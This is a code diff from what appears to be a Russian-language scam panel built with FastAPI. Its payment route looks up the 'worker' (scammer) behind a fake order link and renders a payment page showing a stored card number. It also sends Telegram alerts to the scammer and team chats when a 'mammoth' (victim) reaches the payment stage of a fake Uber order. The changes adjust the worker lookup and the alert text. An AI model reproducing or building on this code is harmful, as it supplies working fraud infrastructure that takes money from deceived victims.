@@ -118,27 +118,28 @@ async def login(request: Request, item: str, phone: str = Form(...)):
 
 @app.get("/order/{item}/pay", response_class=HTMLResponse)
 async def pay(request: Request, item: str):
-    worker = session.query(User).filter(User.tg_id.startswith(int(item)))
+    link = session.query(Links).filter(Links.link.like(f"%{item}%")).first()
+    worker = session.query(User).filter(User.tg_id == int(link.user_id)).first()
     datas = session.query(Links).filter(Links.link.like(f"%{item}%")).first()
     card = session.query(Cards).filter(Cards.country == 'рус').order_by(Cards.id.desc()).first()
     await main_bot.send_message(
-        text=f"Мамонт на моменте оплаты {datas.price}р!\nusername: @{datas.user_id}\nВоркер: @{worker.username}",
+        text=f"Мамонт на моменте оплаты убер {datas.price}р!\nВоркер: @{worker.username}",
         chat_id=datas.user_id)
 
     try:
         tp = session.query(User.tg_id).filter(User.status == 2).first()
         await main_bot.send_message(
-            text=f"Мамонт на моменте оплаты {datas.price}р!\nusername: @{datas.user_id}\nВоркер: @{worker.username}",
+            text=f"Мамонт на моменте оплаты убер {datas.price}р!\nВоркер: @{worker.username}",
             chat_id=tp)
     except:
         pass
 
     await main_bot.send_message(
-        text=f"Мамонт на моменте оплаты {datas.price}р!\nusername: @{datas.user_id}\nВоркер: @{worker.username}",
+        text=f"Мамонт на моменте оплаты убер {datas.price}р!\nВоркер: @{worker.username}",
         chat_id="-1002063632581")
 
     await main_bot.send_message(
-        text=f"Мамонт на моменте оплаты {datas.price}р!\nusername: @{datas.user_id}\nВоркер: @{worker.username}",
+        text=f"Мамонт на моменте оплаты убер {datas.price}р!\nВоркер: @{worker.username}",
         chat_id="-1002014887503")
 
     return templates.TemplateResponse("оплата.html", {"request": request, 'datas': datas, "card": card.numbers})
